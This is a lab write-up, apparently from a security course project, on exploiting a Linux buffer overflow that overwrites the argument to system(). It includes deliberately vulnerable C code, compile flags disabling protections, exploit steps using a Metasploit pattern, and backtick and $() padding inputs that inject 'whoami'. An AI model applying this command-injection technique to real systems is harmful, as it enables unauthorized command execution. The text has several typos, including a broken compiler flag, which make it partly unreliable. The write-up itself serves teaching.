# Proj 1: Linux Buffer Overflow: Command Injection 
*(10 pts. + 15 pts. extra credit)*

URL: https://samsclass.info/127/proj/p1-lbci.htm
## Vulnerable C Code
```
#include <string.h>
#include <stdio.h>
main(){
  char name[200];
  printf("What is your name?\n");
  scanf("%s", name);
  bo(name, "uname -a");
}
int bo(char *name, char *cmd){ // no prototype? ::eyes roll::
  char c[40];
  char buffer[40];
  printf("Name buffer address:    %x\n", buffer);
  printf("Command buffer address: %x\n", c);
  strcpy(c, cmd);
  strcpy(buffer, name);
  printf("Goodbye, %s!\n", buffer);
  printf("Executing command: %s\n", c);
  fflush(stdout);
  system(c);
}
```
Compile with:
```
root@demon:~# gcc fno-stack-protector -z execstack vuln.c -o vuln 
```
## Exploit
1. Run the application
2. Pass input sizes until you get a seg-fault (256 bytes)
3. Create a pattern with `Metasploit/tools/exploit/pattern_create.rb -l 256`
4. Pestart the `vuln` app and pass the pattern to it.
5. Notice where the command injection tackes place in the pattern (40 bytes in)
6. Restart the `vuln` app and pass the forst 40 bytes of the pattern along with `whoami` and you get `root`.

## Notes
### Even number Input Length
This takes 40 bytes to begin overwriting the `cmd` variable. That's an even number eh? So, what if we exploited the fact that Bash will interpret two backticks, and not throw an error even if they return nothing?  - try it. Put 256 backticks, then `whoami` at the very end. Bash will slide-down the backticks and hit your `whoami` command like so,
```
postgres@kali:/tmp$ ./vuln 
What is your name?
``````````````````````````````````````````````whoami
Name buffer address:    bf823110
Command buffer address: bf823138
Goodbye, ``````````````````````````````````````````````whoami!
Executing command: ``````whoami
root
postgres@kali:/tmp$ 
```
### Odd number Input Length
So, what if the input were an odd number? Well, we exploit the blank `$()` construct to have 3 bytes and that (for some odd reason) Bash does not throw a syntax error when these expressions are touching. So now, we have 3 and 2 byte length NOPs (so to speak), which means that we can build any number that we want that is >=2.

For instance, say the input buffer length is 7, we can use the following input,
```
root@demon:~# ./vuln
What's your name?
$()````````````````````````````````````whoami
```
If the buffer input length is 11, we can use the same exact input.
